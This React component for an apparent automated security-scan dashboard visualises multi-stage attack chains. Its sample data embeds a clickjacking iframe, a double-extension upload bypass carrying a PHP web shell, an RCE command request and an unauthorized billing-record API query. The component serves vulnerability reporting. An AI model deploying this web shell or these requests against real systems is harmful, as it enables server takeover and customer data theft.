import React, { useState } from 'react';
import { 
  GitBranch, 
  ArrowRight, 
  Play, 
  ShieldAlert, 
  Lock, 
  Terminal, 
  Code, 
  CheckCircle2, 
  ExternalLink,
  Flame,
  Globe,
  Radio,
  ChevronRight,
  History,
  AlertTriangle,
  Copy,
  Check,
  Zap
} from 'lucide-react';
import { ATTACK_CHAIN, VULNERABILITIES } from '../data/scanData';

export default function AttackChainView({ 
  onSelectVuln, 
  activeScan,
  companyName = "",
  targetUrl = "",
  vulnerabilities = [],
  scanHistory = [],
  activeScanId = '',
  onSelectScan,
  theme = 'light' 
}) {
  const [activeStep, setActiveStep] = useState(0);
  const [isPlaying, setIsPlaying] = useState(false);
  const [copiedCode, setCopiedCode] = useState(false);

  const isSampleAlpha = activeScan?.id?.includes('alpha') || activeScan?.id?.includes('406f');
  const isSampleBeta = activeScan?.id?.includes('beta') || activeScan?.id?.includes('81f4');

  // Define dynamic chain data based on active scan
  const effectiveChain = React.useMemo(() => {
    // 1. If activeScan has custom attackChain with steps or phases
    const rawSteps = activeScan?.attackChain?.steps || activeScan?.attackChain?.phases;
    if (rawSteps && Array.isArray(rawSteps) && rawSteps.length > 0) {
      return {
        title: activeScan.attackChain.title || `${companyName} Attack Vector`,
        targetAsset: activeScan.attackChain.targetHost || targetUrl,
        cvss: activeScan.riskScore || (isSampleBeta ? 8.2 : isSampleAlpha ? 5.5 : 8.3),
        steps: rawSteps.map((s, idx) => ({
          stepNumber: s.step || s.stepNumber || idx + 1,
          type: s.type || (idx === 0 ? 'RECON' : idx === 1 ? 'AUDIT' : idx === 2 ? 'EXPLOIT' : idx === 3 ? 'PIVOT' : 'IMPACT'),
          title: s.name || s.title || `Stage ${idx + 1}`,
          findingRef: s.findingRef || (vulnerabilities[0]?.id || 'vuln-0001'),
          description: s.action || s.description || '',
          impact: s.impact || '',
          target: s.target || targetUrl,
          codeSnippet: s.codeSnippet || (idx === 0 ? `GET / HTTP/1.1\nHost: ${targetUrl}` : `HTTP/1.1 200 OK`)
        }))
      };
    }

    // 2. Sample Alpha Attack Vector
    if (isSampleAlpha) {
      return {
        title: "Perimeter Security & Information Disclosure Attack Vector",
        targetAsset: "cloud.alpha-corp.internal",
        cvss: 5.5,
        steps: [
          {
            stepNumber: 1,
            type: "RECON",
            title: "Autonomous Asset & Endpoint Reconnaissance",
            findingRef: "vuln-0001",
            description: "Autonomous agent probed external web perimeter, TLS certificates, and HTTP response routing.",
            target: "https://cloud.alpha-corp.internal/",
            impact: "Mapped reachable endpoints, server response codes, and exposed headers.",
            codeSnippet: `GET / HTTP/1.1\nHost: cloud.alpha-corp.internal\nUser-Agent: Mozilla/5.0 (Autonomous-VAPT-Agent)\nAccept: text/html,application/xhtml+xml`
          },
          {
            stepNumber: 2,
            type: "AUDIT",
            title: "Security Header & Defense-in-Depth Verification",
            findingRef: "vuln-0001",
            description: "Audited HTTP response headers against OWASP WSTG v4.2 defense criteria. Confirmed total absence of CSP, HSTS, X-Frame-Options, and X-Content-Type-Options.",
            target: "https://cloud.alpha-corp.internal/",
            impact: "Identified complete lack of clickjacking, MIME-sniffing, and transport security controls.",
            codeSnippet: `HTTP/1.1 200 OK\n(Content-Security-Policy: ABSENT)\n(Strict-Transport-Security: ABSENT)\n(X-Frame-Options: ABSENT)\n(X-Content-Type-Options: ABSENT)`
          },
          {
            stepNumber: 3,
            type: "EXPLOIT",
            title: "Target Information Disclosure & Framing Vector",
            findingRef: "vuln-0001",
            description: "Verified that missing X-Frame-Options allows the web application to be embedded in external malicious contexts.",
            target: "https://cloud.alpha-corp.internal/",
            impact: "Elevated risk of adversary reconnaissance, credential phishing overlays, and clickjacking attacks.",
            codeSnippet: `<!-- Proof of Concept Clickjacking Overlay -->\n<iframe src="https://cloud.alpha-corp.internal/" style="opacity:0.8; width:100%; height:600px;"></iframe>`
          }
        ]
      };
    }

    // 3. Sample Beta Attack Chain
    if (isSampleBeta) {
      return {
        title: "Remote File Upload to Member Data Access Chain",
        targetAsset: "portal.beta-energy.internal",
        cvss: 8.2,
        steps: [
          {
            stepNumber: 1,
            type: "RECON",
            title: "Public Endpoint Discovery",
            findingRef: "vuln-0004",
            description: "Autonomous agent identified an unrestricted file upload form on the contact feedback portal without backend extension enforcement.",
            target: "https://portal.beta-energy.internal/contact/submit-attachment",
            impact: "Identified writable upload directory without server-side validation.",
            codeSnippet: `POST /contact/submit-attachment HTTP/1.1\nHost: portal.beta-energy.internal\nContent-Type: multipart/form-data; boundary=---------------------------98721\n\n-----------------------------98721\nContent-Disposition: form-data; name="file"; filename="invoice.php.pdf"\nContent-Type: image/png`
          },
          {
            stepNumber: 2,
            type: "BYPASS",
            title: "MIME Filter Bypass & Payload Upload",
            findingRef: "vuln-0004",
            description: "Crafted double-extension payload bypassing client-side MIME checks, saving executable PHP script inside /uploads/feedback/.",
            target: "https://portal.beta-energy.internal/contact/submit-attachment",
            impact: "Web shell successfully placed in web-accessible storage.",
            codeSnippet: `// Double Extension Validation Bypass:\nContent-Disposition: form-data; name="file"; filename="payload.php.pdf"\nContent-Type: image/png\n\n<?php if(isset($_REQUEST['cmd'])){ echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; } ?>`
          },
          {
            stepNumber: 3,
            type: "EXPLOIT",
            title: "Remote Code Execution (RCE)",
            findingRef: "vuln-0004",
            description: "Invoked the uploaded script over HTTP GET, executing arbitrary commands under the web server daemon context.",
            target: "https://portal.beta-energy.internal/uploads/feedback/payload.php",
            impact: "Full server execution and access to environment configurations.",
            codeSnippet: `GET /uploads/feedback/payload.php?cmd=id;uname -a HTTP/1.1\nHost: portal.beta-energy.internal\n\nHTTP/1.1 200 OK\nuid=33(www-data) gid=33(www-data) groups=33(www-data)`
          },
          {
            stepNumber: 4,
            type: "PIVOT",
            title: "Internal Member API BOLA Access",
            findingRef: "vuln-0001",
            description: "Used server access to query internal customer API endpoints, extracting member records and billing accounts without tenant isolation.",
            target: "https://portal.beta-energy.internal/api/v1/accounts/details",
            impact: "Unauthorized extraction of customer billing records and telemetry.",
            codeSnippet: `POST /api/v1/accounts/details HTTP/1.1\nHost: portal.beta-energy.internal\nAuthorization: Bearer <VALID_MEMBER_TOKEN>\nContent-Type: application/json\n\n{"accountId": "ACC-MEM-0098412", "includeBilling": true}\n\nHTTP/1.1 200 OK\n{"status":"success","member":"Jane Doe","meterId":"MTR-98214","balance":142.50}`
          }
        ]
      };
    }

    // 4. Default Demonstration Chain
    return ATTACK_CHAIN;
  }, [activeScan, companyName, targetUrl, isSampleBeta, isSampleAlpha, vulnerabilities]);

  const steps = effectiveChain.steps || [];
  const safeActiveStep = Math.min(activeStep, steps.length - 1);
  const currentStepData = steps[safeActiveStep] || steps[0] || {};
  const linkedVuln = vulnerabilities.find(v => v.id === currentStepData.findingRef);

  const handleCopyCode = (snippet) => {
    if (!snippet) return;
    navigator.clipboard.writeText(snippet);
    setCopiedCode(true);
    setTimeout(() => setCopiedCode(false), 2000);
  };

  const handlePlaySimulation = () => {
    setIsPlaying(true);
    let step = 0;
    setActiveStep(0);
    const interval = setInterval(() => {
      if (step < steps.length - 1) {
        step++;
        setActiveStep(step);
      } else {
        clearInterval(interval);
        setIsPlaying(false);
      }
    }, 1200);
  };

  if (!activeScan && (!scanHistory || scanHistory.length === 0)) {
    return (
      <div className="space-y-6 max-w-7xl mx-auto pb-12">
        <div className={`p-12 rounded-2xl border text-center space-y-4 ${
          theme === 'dark' ? 'bg-[#001B41] border-[#002B66]' : 'bg-white border-slate-200 shadow-card-premium'
        }`}>
          <div className="w-14 h-14 rounded-2xl bg-[#006FE3]/10 text-[#006FE3] mx-auto flex items-center justify-center border border-[#006FE3]/20 shadow-sm">
            <GitBranch className="w-7 h-7" />
          </div>
          <div className="space-y-1.5">
            <h4 className={`text-base font-extrabold font-heading ${theme === 'dark' ? 'text-white' : 'text-[#001B41]'}`}>
              No Attack Chain Available
            </h4>
            <p className="text-xs text-slate-500 max-w-md mx-auto leading-relaxed">
              No chained exploit paths exist for your account yet. Launch an automated security scan to generate an end-to-end attack simulation graph.
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-6 max-w-7xl mx-auto pb-12">
      {/* Target Session Switcher */}
      {scanHistory.length > 0 && (
        <div className={`p-4 rounded-2xl border flex flex-col sm:flex-row sm:items-center justify-between gap-4 text-xs font-mono transition-all ${
          theme === 'dark' 
            ? 'bg-[#001B41] border-[#002B66] text-slate-300' 
            : 'bg-white border-slate-200/90 text-slate-800 shadow-card-premium'
        }`}>
          <div className="flex items-center gap-2.5 min-w-0">
            <span className="text-[#006FE3] font-bold uppercase tracking-wider flex items-center gap-1.5 font-heading">
              <History className="w-4 h-4 text-[#006FE3]" />
              Target Attack Graph:
            </span>
            <span className={`font-extrabold truncate text-sm font-heading ${theme === 'dark' ? 'text-white' : 'text-[#001B41]'}`}>
              {companyName}
            </span>
            <span className="text-slate-300 hidden sm:inline">&bull;</span>
            <span className="text-slate-500 truncate hidden sm:inline font-mono text-[11px]">
              {targetUrl}
            </span>
          </div>

          <div className="flex items-center gap-2 flex-shrink-0">
            <span className={`${theme === 'dark' ? 'text-slate-400' : 'text-slate-600'} text-[11px] font-bold font-sans`}>
              Session:
            </span>
            <select
              value={activeScanId}
              onChange={(e) => {
                const selected = scanHistory.find(s => s.id === e.target.value);
                if (selected && onSelectScan) {
                  onSelectScan(selected, true);
                  setActiveStep(0);
                }
              }}
              className={`px-3 py-1.5 rounded-xl font-mono text-xs focus:outline-none border transition-all ${
                theme === 'dark'
                  ? 'bg-[#001127] border-[#002B66] text-white focus:border-[#006FE3]'
                  : 'bg-slate-50 border-slate-200 text-slate-900 focus:border-[#006FE3]'
              }`}
            >
              {scanHistory.map((scan) => {
                const count = (scan.vulnerabilities && scan.vulnerabilities.length > 0)
                  ? scan.vulnerabilities.length
                  : (scan.findingsCount || (scan.id?.includes('alpha') ? 4 : (scan.id?.includes('beta') ? 4 : 7)));
                return (
                  <option key={scan.id} value={scan.id}>
                    {scan.companyName} ({count} {count === 1 ? 'finding' : 'findings'})
                  </option>
                );
              })}
            </select>
          </div>
        </div>
      )}

      {/* Hero Header Panel */}
      <div className={`p-6 sm:p-7 rounded-2xl border space-y-4 transition-all relative overflow-hidden ${
        theme === 'dark' 
          ? 'bg-[#001B41] border-[#002B66]' 
          : 'bg-white border-slate-200/90 shadow-card-premium'
      }`}>
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-5 relative z-10">
          <div className="space-y-1.5">
            <div className="flex items-center gap-2 text-[#006FE3] font-mono text-xs font-bold uppercase tracking-wider font-heading">
              <GitBranch className="w-4 h-4 text-[#006FE3]" />
              <span>Chained Exploit Path &bull; {companyName}</span>
            </div>
            <h2 className={`text-2xl sm:text-3xl font-extrabold tracking-tight font-heading ${
              theme === 'dark' ? 'text-white' : 'text-[#001B41]'
            }`}>
              {effectiveChain.title}
            </h2>
            <div className="flex flex-wrap items-center gap-3 pt-1 text-xs">
              <span className={`font-mono ${theme === 'dark' ? 'text-slate-300' : 'text-slate-600'}`}>
                Target Asset: <strong className="text-[#006FE3] font-mono font-bold">{effectiveChain.targetAsset}</strong>
              </span>
              <span className="text-slate-300 hidden sm:inline">&bull;</span>
              <span className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full font-mono text-[11px] font-bold bg-[#DC2626]/10 text-[#DC2626] border border-[#DC2626]/30">
                <Flame className="w-3 h-3 text-[#DC2626]" />
                Aggregated Risk: CVSS {effectiveChain.cvss}
              </span>
              <span className="text-slate-300 hidden sm:inline">&bull;</span>
              <span className="text-[11px] font-mono text-slate-500 font-medium">
                {steps.length} Sequenced Exploit Stages
              </span>
            </div>
          </div>

          <button
            onClick={handlePlaySimulation}
            disabled={isPlaying}
            className={`flex items-center gap-2.5 px-6 py-3 rounded-xl font-bold text-xs font-heading transition-all shadow-md ${
              isPlaying
                ? 'bg-[#006FE3]/20 text-[#006FE3] border border-[#006FE3]/40 cursor-wait animate-pulse'
                : 'bg-[#006FE3] hover:bg-[#005bbd] text-white shadow-[#006FE3]/25 hover:scale-[1.02] active:scale-[0.98]'
            }`}
          >
            <Play className="w-4 h-4 fill-current" />
            <span>{isPlaying ? 'Simulating Exploit...' : 'Play Exploit Animation'}</span>
          </button>
        </div>
      </div>

      {/* Stepper Card */}
      <div className={`p-6 sm:p-7 rounded-2xl border space-y-6 transition-all ${
        theme === 'dark' 
          ? 'bg-[#001B41] border-[#002B66]' 
          : 'bg-white border-slate-200/90 shadow-card-premium'
      }`}>
        <div className={`flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b pb-3.5 ${
          theme === 'dark' ? 'border-[#002B66]' : 'border-slate-100'
        }`}>
          <div className="flex items-center gap-2">
            <span className="w-2.5 h-2.5 rounded-full bg-[#006FE3] animate-pulse"></span>
            <span className={`text-xs font-mono font-bold uppercase tracking-wider ${
              theme === 'dark' ? 'text-slate-300' : 'text-[#001B41]'
            }`}>
              Multi-Stage Attack Graph ({steps.length} Stages)
            </span>
          </div>
          <span className="text-xs font-mono text-[#006FE3] font-semibold">
            Select any node to inspect payload &amp; impact
          </span>
        </div>

        {/* Step Flowchart Cards */}
        <div 
          className="grid gap-3.5"
          style={{
            gridTemplateColumns: `repeat(${steps.length}, minmax(0, 1fr))`
          }}
        >
          {steps.map((step, idx) => {
            const isSelected = safeActiveStep === idx;
            const isPassed = safeActiveStep >= idx;

            const isImpact = step.type === 'IMPACT' || step.type === 'EXPLOIT';
            const isPivot = step.type === 'PIVOT' || step.type === 'INTERNAL' || step.type === 'ESCALATE';

            return (
              <div
                key={idx}
                onClick={() => setActiveStep(idx)}
                className={`p-4 rounded-xl cursor-pointer border transition-all text-left relative group ${
                  isSelected
                    ? 'bg-[#006FE3]/10 border-[#006FE3] ring-2 ring-[#006FE3]/30 shadow-md'
                    : isPassed
                    ? theme === 'dark' 
                      ? 'bg-[#001127] border-[#002B66] hover:border-[#006FE3]/50' 
                      : 'bg-slate-50 border-slate-200 hover:border-[#006FE3]/50 hover:bg-white'
                    : theme === 'dark' 
                    ? 'bg-[#001127]/50 border-[#002B66]/60 opacity-60' 
                    : 'bg-slate-100/70 border-slate-200 opacity-60'
                }`}
              >
                <div className="flex items-center justify-between mb-2">
                  <span className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-mono font-bold transition-all ${
                    isSelected
                      ? 'bg-[#006FE3] text-white shadow-sm ring-2 ring-[#006FE3]/20'
                      : isPassed
                      ? isImpact
                        ? 'bg-[#DC2626]/20 text-[#DC2626] border border-[#DC2626]/40'
                        : isPivot
                        ? 'bg-[#3C2C86]/30 text-[#80B7F1] border border-[#3C2C86]'
                        : 'bg-[#006FE3]/20 text-[#006FE3] border border-[#006FE3]/40'
                      : 'bg-slate-200 dark:bg-slate-800 text-slate-500'
                  }`}>
                    {step.stepNumber}
                  </span>
                  <span className={`text-[10px] font-mono font-bold tracking-wider uppercase ${
                    isImpact 
                      ? 'text-[#DC2626]' 
                      : isPivot 
                      ? 'text-[#80B7F1]' 
                      : theme === 'dark' ? 'text-slate-400' : 'text-slate-500'
                  }`}>
                    {step.type}
                  </span>
                </div>

                <div className={`text-xs font-bold font-heading mb-1 line-clamp-1 ${
                  isSelected 
                    ? 'text-[#006FE3]' 
                    : theme === 'dark' ? 'text-white' : 'text-[#001B41]'
                }`}>
                  {step.title}
                </div>
                <div className="text-[11px] font-mono text-slate-500 group-hover:text-[#006FE3] transition-colors">
                  Ref: <span className="font-semibold text-[#006FE3]">{step.findingRef}</span>
                </div>
              </div>
            );
          })}
        </div>

        {/* Selected Stage Detail Panel */}
        <div className={`p-6 rounded-xl border space-y-4 transition-all ${
          theme === 'dark' 
            ? 'bg-[#001127] border-[#002B66]' 
            : 'bg-slate-50 border-slate-200/90'
        }`}>
          <div className={`flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b pb-3.5 ${
            theme === 'dark' ? 'border-[#002B66]' : 'border-slate-200'
          }`}>
            <div className="flex flex-wrap items-center gap-3">
              <span className="text-xs font-mono font-bold px-3 py-1 rounded-lg bg-[#006FE3] text-white shadow-sm">
                Stage {currentStepData.stepNumber}: {currentStepData.type}
              </span>
              <h3 className={`text-base font-extrabold font-heading ${theme === 'dark' ? 'text-white' : 'text-[#001B41]'}`}>
                {currentStepData.title}
              </h3>
            </div>

            {linkedVuln && (
              <button
                onClick={() => onSelectVuln(linkedVuln)}
                className={`flex items-center gap-1.5 text-xs font-mono font-bold text-[#006FE3] px-3.5 py-1.5 rounded-xl border transition-all ${
                  theme === 'dark' 
                    ? 'bg-[#001B41] border-[#002B66] hover:bg-[#006FE3] hover:text-white' 
                    : 'bg-white border-slate-200 hover:bg-[#006FE3] hover:text-white shadow-sm'
                }`}
              >
                <span>Inspect {currentStepData.findingRef}</span>
                <ExternalLink className="w-3.5 h-3.5" />
              </button>
            )}
          </div>

          <p className={`text-xs sm:text-sm leading-relaxed font-sans ${
            theme === 'dark' ? 'text-slate-300' : 'text-slate-700'
          }`}>
            {currentStepData.description}
          </p>

          {currentStepData.impact && (
            <div className="p-4 rounded-xl bg-[#DC2626]/10 border border-[#DC2626]/30 text-[#DC2626] text-xs font-mono leading-relaxed flex items-start gap-2.5">
              <AlertTriangle className="w-4 h-4 text-[#DC2626] flex-shrink-0 mt-0.5" />
              <div>
                <strong className="font-bold">Security Impact:</strong> {currentStepData.impact}
              </div>
            </div>
          )}

          {/* Technical Code / Payload Snippet */}
          {currentStepData.codeSnippet && (
            <div className="space-y-2 pt-1">
              <div className="flex items-center justify-between">
                <div className="text-xs font-mono font-bold text-[#006FE3] flex items-center gap-1.5 font-heading">
                  <Terminal className="w-3.5 h-3.5 text-[#006FE3]" />
                  <span>Technical Exploit Payload &amp; Response:</span>
                </div>
                <button
                  onClick={() => handleCopyCode(currentStepData.codeSnippet)}
                  className={`flex items-center gap-1.5 px-3 py-1 rounded-lg text-xs font-mono border transition-all ${
                    copiedCode
                      ? 'bg-emerald-500/15 border-emerald-500/40 text-emerald-600'
                      : theme === 'dark'
                      ? 'bg-[#001B41] hover:bg-[#002B66] text-slate-300 border-[#002B66]'
                      : 'bg-white hover:bg-slate-100 text-slate-700 border-slate-200 shadow-sm'
                  }`}
                >
                  {copiedCode ? (
                    <>
                      <Check className="w-3.5 h-3.5 text-emerald-500" />
                      <span className="font-bold">Copied!</span>
                    </>
                  ) : (
                    <>
                      <Copy className="w-3.5 h-3.5" />
                      <span>Copy Payload</span>
                    </>
                  )}
                </button>
              </div>

              <pre className="p-4 rounded-xl bg-[#001127] border border-[#002B66] text-cyan-300 font-mono text-xs overflow-x-auto select-all leading-relaxed shadow-inner">
                <code>{currentStepData.codeSnippet}</code>
              </pre>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

